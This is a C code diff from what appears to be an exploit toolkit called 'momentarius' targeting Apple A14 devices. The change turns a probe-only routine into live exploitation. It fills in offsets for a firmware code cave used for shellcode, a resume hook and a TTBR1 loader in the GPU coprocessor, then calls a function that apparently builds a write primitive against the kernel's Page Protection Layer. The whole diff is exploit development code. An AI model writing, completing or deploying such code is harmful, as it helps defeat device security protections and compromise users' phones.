@@ -139,9 +139,9 @@ static int a14_find_resume_path(uint64_t first_page) {
     }
     if (hook == 0) return -1;
 
-    momentarius.gfx.a14_probe.ttbr1_msr_offset = ttbr1_msr;
-    momentarius.gfx.a14_probe.ttbr_decode_offset = decoder;
-    momentarius.gfx.a14_probe.resume_hook_offset = hook;
+    momentarius.gfx.a14.ttbr1_msr_offset = ttbr1_msr;
+    momentarius.gfx.a14.ttbr_decode_offset = decoder;
+    momentarius.gfx.a14.resume_hook_offset = hook;
     return 0;
 }
 
@@ -181,8 +181,8 @@ static int a14_find_bptp(void) {
         return -1;
     }
 
-    momentarius.gfx.a14_probe.bptp_offset = match;
-    momentarius.gfx.a14_probe.bptp_value_offset = value_offset;
+    momentarius.gfx.a14.bptp_offset = match;
+    momentarius.gfx.a14.bptp_value_offset = value_offset;
     momentarius.gfx.ttbr_pa = ttbr_pa;
     return 0;
 }
@@ -197,8 +197,8 @@ int momentarius_init_A14(void) {
         debug_log("A14 executable-padding candidate is not empty\n");
         return -1;
     }
-    momentarius.gfx.a14_probe.code_cave_offset = A14_CAVE_START;
-    momentarius.gfx.a14_probe.code_cave_size = A14_CAVE_END - A14_CAVE_START;
+    momentarius.gfx.a14.code_cave_offset = A14_CAVE_START;
+    momentarius.gfx.a14.code_cave_size = A14_CAVE_END - A14_CAVE_START;
 
     if (a14_find_resume_path(first_page) != 0) {
         debug_log("A14 RTKit resume path did not match the expected semantics\n");
@@ -209,18 +209,23 @@ int momentarius_init_A14(void) {
     momentarius.gfx.ttbr_kva = gfx_phystokv(momentarius.gfx.ttbr_pa);
     if (!KADDR_VALID(momentarius.gfx.ttbr_kva)) return -1;
 
-    debug_log("A14 BPTP: text+0x%x (value text+0x%x)\n",
-              momentarius.gfx.a14_probe.bptp_offset,
-              momentarius.gfx.a14_probe.bptp_value_offset);
-    debug_log("A14 TTBR1 decoder: text+0x%x; msr: text+0x%x\n",
-              momentarius.gfx.a14_probe.ttbr_decode_offset,
-              momentarius.gfx.a14_probe.ttbr1_msr_offset);
-    debug_log("A14 resume hook candidate: text+0x%x\n",
-              momentarius.gfx.a14_probe.resume_hook_offset);
-    debug_log("A14 executable padding: text+0x%x..0x%x\n",
-              momentarius.gfx.a14_probe.code_cave_offset,
-              momentarius.gfx.a14_probe.code_cave_offset +
-                  momentarius.gfx.a14_probe.code_cave_size);
+    momentarius.gfx.method = 2;
+    momentarius.gfx.shc_offset = A14_CAVE_START;
+    momentarius.gfx.ttbr1_load_offset = momentarius.gfx.a14.ttbr_decode_offset;
+    momentarius.gfx.hook_offset = momentarius.gfx.a14.resume_hook_offset;
 
-    return MOMENTARIUS_A14_PROBE_ONLY;
+    debug_log("A14 BPTP: text+0x%x (value text+0x%x)\n",
+              momentarius.gfx.a14.bptp_offset,
+              momentarius.gfx.a14.bptp_value_offset);
+    debug_log("A14 TTBR1 decoder: text+0x%x; msr: text+0x%x\n",
+              momentarius.gfx.a14.ttbr_decode_offset,
+              momentarius.gfx.a14.ttbr1_msr_offset);
+    debug_log("A14 resume hook candidate: text+0x%x\n",
+              momentarius.gfx.a14.resume_hook_offset);
+    debug_log("A14 executable padding: text+0x%x..0x%x\n",
+              momentarius.gfx.a14.code_cave_offset,
+              momentarius.gfx.a14.code_cave_offset +
+                  momentarius.gfx.a14.code_cave_size);
+
+    return momentarius_build_ppl_write();
 }
